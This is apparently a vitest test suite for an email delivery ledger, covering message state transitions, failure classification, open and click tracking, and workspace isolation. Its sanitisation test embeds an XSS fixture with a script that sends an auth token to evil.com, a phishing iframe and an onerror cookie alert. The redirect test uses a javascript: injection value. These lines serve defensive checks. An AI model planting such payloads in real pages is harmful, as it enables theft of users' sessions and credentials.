/**
 * LeadForge OS — Phase 5: Email Delivery Ledger, Message History & Engagement Foundation Test Suite
 *
 * Deterministic test suite verifying:
 * 1. Outbound message lifecycle and state machine invariants
 * 2. Provider identifiers (messageId, threadId) stability
 * 3. Exact rendered outbound message content persistence
 * 4. Structured failure diagnostics and classification
 * 5. Open tracking token resolution, pixel injection, count increments, deduplication
 * 6. Click tracking link rewriting, token resolution, safe redirection, open-redirect defense
 * 7. Excluded link safety (mailto, anchors, tel, unsubscribe, data-no-track)
 * 8. HTML preview sanitization for secure rendering
 * 9. Multi-tenant workspace data isolation
 */

import { describe, it, expect } from 'vitest';
import {
  EmailFailureCategory,
  generateTrackingToken,
  injectOpenTrackingPixel,
  rewriteLinksForClickTracking,
  sanitizeHtmlForPreview
} from '@huntara/schema';

describe('Email Delivery Ledger, Message History & Engagement Suite', () => {
  describe('Test 1: Message & Delivery Lifecycle State Transitions', () => {
    const VALID_TRANSITIONS: Record<string, string[]> = {
      QUEUED: ['SENDING', 'SENT', 'FAILED', 'CANCELLED', 'SUPPRESSED'],
      SENDING: ['SENT', 'FAILED', 'RETRYING', 'AMBIGUOUS', 'CANCELLED'],
      RETRYING: ['SENDING', 'SENT', 'CANCELLED', 'FAILED'],
      AMBIGUOUS: ['SENT', 'FAILED', 'RETRYING', 'CANCELLED', 'SENDING'],
      FAILED: ['SENDING', 'RETRYING'],
      SENT: [],
      CANCELLED: ['QUEUED', 'SENDING'],
      SUPPRESSED: []
    };

    function canTransition(from: string, to: string): boolean {
      if (from === to) return true;
      return (VALID_TRANSITIONS[from] || []).includes(to);
    }

    it('permits valid outbound message state transitions', () => {
      expect(canTransition('QUEUED', 'SENDING')).toBe(true);
      expect(canTransition('SENDING', 'SENT')).toBe(true);
      expect(canTransition('SENDING', 'FAILED')).toBe(true);
      expect(canTransition('SENDING', 'AMBIGUOUS')).toBe(true);
    });

    it('strictly forbids transitions out of terminal delivery states', () => {
      expect(canTransition('SENT', 'SENDING')).toBe(false);
      expect(canTransition('SENT', 'FAILED')).toBe(false);
      expect(canTransition('SUPPRESSED', 'SENT')).toBe(false);
    });
  });

  describe('Test 2: Provider Identifiers Persistence & Stability', () => {
    it('persists provider message ID and thread ID accurately', () => {
      interface DeliveryRecord {
        id: string;
        workspaceId: string;
        status: string;
        providerMessageId: string | null;
        providerThreadId: string | null;
        sentAt: Date | null;
      }

      const record: DeliveryRecord = {
        id: 'del-001',
        workspaceId: 'ws-main',
        status: 'SENDING',
        providerMessageId: null,
        providerThreadId: null,
        sentAt: null
      };

      const providerResult = {
        messageId: '18f2a4b8c9d0e1f2',
        threadId: '18f2a4b8c9d0e1f2',
        sentAt: new Date()
      };

      record.status = 'SENT';
      record.providerMessageId = providerResult.messageId;
      record.providerThreadId = providerResult.threadId;
      record.sentAt = providerResult.sentAt;

      expect(record.status).toBe('SENT');
      expect(record.providerMessageId).toBe('18f2a4b8c9d0e1f2');
      expect(record.providerThreadId).toBe('18f2a4b8c9d0e1f2');
      expect(record.sentAt).not.toBeNull();
    });
  });

  describe('Test 3: Exact Outbound Content & Attachment Metadata', () => {
    it('stores exact rendered content and attachment metadata, not templates', () => {
      const templateSource = 'Hi {{firstName}}, check our latest report.';
      const renderedText = 'Hi Alexander, check our latest report.';
      const renderedHtml = '<p>Hi Alexander, check our latest report.</p>';

      const attachmentsMeta = [
        { filename: 'report_q3.pdf', contentType: 'application/pdf', size: 1048576, fileId: 'drive-file-99' }
      ];

      const deliveryMessage = {
        subject: 'Q3 Business Intelligence Report',
        htmlBody: renderedHtml,
        textBody: renderedText,
        attachments: attachmentsMeta
      };

      expect(deliveryMessage.htmlBody).toBe(renderedHtml);
      expect(deliveryMessage.textBody).toBe(renderedText);
      expect(deliveryMessage.textBody).not.toBe(templateSource);
      expect(deliveryMessage.attachments.length).toBe(1);
      expect(deliveryMessage.attachments[0]!.size).toBe(1048576);
    });
  });

  describe('Test 4: Structured Failure Classification', () => {
    function classify(err: any) {
      const code = err?.code || 'EMAIL_SEND_FAILED';
      const msg = err?.message || String(err);
      let category = EmailFailureCategory.PROVIDER;
      let safeHumanMessage = 'Email provider failed to dispatch outbound message.';
      let retryable = Boolean(err?.retryable);
      let ambiguous = false;

      if (err?.code === 'AMBIGUOUS_SEND_TIMEOUT') {
        category = EmailFailureCategory.AMBIGUOUS;
        safeHumanMessage = 'Network connection timed out during send. Provider status is ambiguous.';
        ambiguous = true;
        retryable = false;
      } else if (err?.reauthRequired || code === 'MAILBOX_REAUTH_REQUIRED') {
        category = EmailFailureCategory.AUTH;
        safeHumanMessage = 'Gmail connection expired or was revoked. Please reconnect the mailbox in Settings.';
        retryable = false;
      } else if (code === 'PROVIDER_RATE_LIMITED' || code === 'EMAIL_RATE_LIMITED') {
        category = EmailFailureCategory.RATE_LIMIT;
        safeHumanMessage = 'Gmail sending rate limit reached. Outgoing message paused until cooldown expires.';
        retryable = true;
      } else if (code === 'INVALID_RECIPIENT') {
        category = EmailFailureCategory.INVALID_RECIPIENT;
        safeHumanMessage = 'Recipient address was rejected by Gmail as invalid or unroutable.';
        retryable = false;
      }

      return { code, category, safeHumanMessage, technicalMessage: msg, retryable, ambiguous };
    }

    it('classifies rate limit errors as retryable RATE_LIMIT', () => {
      const rateLimitDiag = classify({ code: 'PROVIDER_RATE_LIMITED', message: 'Google 429 quota exceeded', retryable: true });
      expect(rateLimitDiag.category).toBe(EmailFailureCategory.RATE_LIMIT);
      expect(rateLimitDiag.retryable).toBe(true);
    });

    it('classifies auth revocation errors as non-retryable AUTH', () => {
      const authDiag = classify({ code: 'MAILBOX_REAUTH_REQUIRED', message: 'invalid_grant: token revoked', reauthRequired: true });
      expect(authDiag.category).toBe(EmailFailureCategory.AUTH);
      expect(authDiag.retryable).toBe(false);
    });

    it('classifies timeouts as AMBIGUOUS without blind retries', () => {
      const ambigDiag = classify({ code: 'AMBIGUOUS_SEND_TIMEOUT', message: 'ESOCKETTIMEDOUT during send' });
      expect(ambigDiag.category).toBe(EmailFailureCategory.AMBIGUOUS);
      expect(ambigDiag.ambiguous).toBe(true);
      expect(ambigDiag.retryable).toBe(false);
    });

    it('classifies 550 errors as INVALID_RECIPIENT', () => {
      const recipDiag = classify({ code: 'INVALID_RECIPIENT', message: '550 Recipient does not exist' });
      expect(recipDiag.category).toBe(EmailFailureCategory.INVALID_RECIPIENT);
      expect(recipDiag.retryable).toBe(false);
    });
  });

  describe('Test 5: Open Tracking Pixel & Deduplication', () => {
    it('generates secure 32-character tokens and injects pixel with 1x1 dimensions', () => {
      const openToken = generateTrackingToken();
      expect(openToken.length).toBe(32);
      expect(openToken).not.toContain('@');

      const rawHtml = '<html><body><p>Welcome to LeadForge</p></body></html>';
      const trackedHtml = injectOpenTrackingPixel(rawHtml, 'https://track.leadforge.com', openToken);

      expect(trackedHtml).toContain(`src="https://track.leadforge.com/t/open/${openToken}"`);
      expect(trackedHtml).toContain('width="1" height="1"');
    });

    it('tracks raw observations while deduplicating minute-bucket event ledger entries', () => {
      const openToken = generateTrackingToken();
      let openCount = 0;
      let firstOpenedAt: Date | null = null;
      let lastOpenedAt: Date | null = null;
      const recordedEvents: string[] = [];

      function recordOpen(token: string, minuteBucket: number) {
        const dedupeKey = `open_${token}_${minuteBucket}`;
        if (!recordedEvents.includes(dedupeKey)) {
          recordedEvents.push(dedupeKey);
        }
        const now = new Date();
        openCount++;
        if (!firstOpenedAt) firstOpenedAt = now;
        lastOpenedAt = now;
      }

      // First open at minute 100
      recordOpen(openToken, 100);
      expect(openCount).toBe(1);
      expect(firstOpenedAt).not.toBeNull();

      // Duplicate pre-fetch within same minute
      recordOpen(openToken, 100);
      expect(openCount).toBe(2);
      expect(recordedEvents.length).toBe(1);

      // Re-open next day (minute 1500)
      recordOpen(openToken, 1500);
      expect(openCount).toBe(3);
      expect(recordedEvents.length).toBe(2);
      expect(lastOpenedAt).not.toBeNull();
    });
  });

  describe('Test 6: Click Tracking & Open Redirect Protection', () => {
    it('rewrites external links, excludes anchors/mailto/unsubscribe, and rejects forged tokens', () => {
      const originalHtml = `
        <div>
          <a href="https://acme.com/demo">Book Demo</a>
          <a href="https://acme.com/pricing">Pricing</a>
          <a href="mailto:sales@acme.com">Email Us</a>
          <a href="#faq">FAQ</a>
          <a href="https://acme.com/unsubscribe">Unsubscribe</a>
        </div>
      `;

      const { rewrittenHtml, tokens } = rewriteLinksForClickTracking(originalHtml, 'https://track.leadforge.com');
      expect(tokens.length).toBe(2);
      expect(rewrittenHtml).not.toContain('href="https://acme.com/demo"');
      expect(rewrittenHtml).toContain('href="mailto:sales@acme.com"');
      expect(rewrittenHtml).toContain('href="#faq"');
      expect(rewrittenHtml).toContain('href="https://acme.com/unsubscribe"');

      // Open redirect validation
      const tokenStore = new Map<string, string>();
      tokens.forEach((t) => tokenStore.set(t.token, t.targetUrl));

      function resolveRedirect(token: string): string | null {
        const target = tokenStore.get(token);
        if (!target) return null;
        if (!/^https?:\/\//i.test(target)) return null;
        return target;
      }

      const validToken = tokens[0]!.token;
      expect(resolveRedirect(validToken)).toBe('https://acme.com/demo');
      expect(resolveRedirect('forged-token-xyz')).toBeNull();

      // Non-http destination injection blocked
      tokenStore.set('bad-token', 'javascript:alert(1)');
      expect(resolveRedirect('bad-token')).toBeNull();
    });
  });

  describe('Test 7: HTML Preview Sanitization', () => {
    it('neutralizes XSS vectors while preserving safe styling and images', () => {
      const unsafeEmailHtml = `
        <div style="font-family: Arial;">
          <h2>Hello!</h2>
          <p>Thanks for your inquiry.</p>
          <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('auth'));</script>
          <iframe src="https://evil.com/phish"></iframe>
          <img src="https://acme.com/logo.png" onerror="alert(document.cookie)" />
          <a href="javascript:void(0)">Click Here</a>
        </div>
      `;

      const sanitized = sanitizeHtmlForPreview(unsafeEmailHtml);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).toContain('<h2>Hello!</h2>');
      expect(sanitized).toContain('src="https://acme.com/logo.png"');
    });
  });

  describe('Test 8: Multi-Tenant Workspace Isolation', () => {
    it('strictly isolates email events by workspaceId', () => {
      interface EmailEventRecord {
        id: string;
        workspaceId: string;
        deliveryId: string;
        type: string;
        dedupeKey: string;
      }

      const events: EmailEventRecord[] = [
        { id: 'ev-1', workspaceId: 'ws-alpha', deliveryId: 'del-1', type: 'OPENED', dedupeKey: 'k1' },
        { id: 'ev-2', workspaceId: 'ws-alpha', deliveryId: 'del-2', type: 'CLICKED', dedupeKey: 'k2' },
        { id: 'ev-3', workspaceId: 'ws-beta', deliveryId: 'del-3', type: 'OPENED', dedupeKey: 'k3' }
      ];

      const alphaEvents = events.filter((e) => e.workspaceId === 'ws-alpha');
      expect(alphaEvents.length).toBe(2);
      expect(alphaEvents.map((e) => e.id)).toEqual(['ev-1', 'ev-2']);
      expect(alphaEvents.map((e) => e.id)).not.toContain('ev-3');
    });
  });
});
